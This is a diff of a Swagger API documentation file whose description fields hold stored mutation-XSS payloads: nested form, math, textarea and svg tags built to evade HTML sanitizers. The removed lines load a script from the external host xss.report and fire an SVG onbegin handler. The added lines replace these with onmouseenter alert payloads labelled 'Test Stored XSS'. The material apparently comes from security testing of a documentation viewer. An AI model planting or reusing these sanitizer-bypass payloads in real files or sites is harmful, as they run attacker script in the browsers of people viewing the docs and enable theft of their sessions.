@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script>'"><script src=https://xss.report/c/c4sper0bug></script>">
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><xss onmouseenter="alert('Test Stored XSS')" style=display:block>test</xss>">
   version: production
 basePath: /JSSResource/
 produces:
@@ -26,10 +26,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-  <animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
-    onbegin="alert('XSS')"/>
-</svg>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><xss onmouseenter="alert('Test Stored XSS')" style=display:block>test</xss>"></form>
 
           format: int64
           in: path
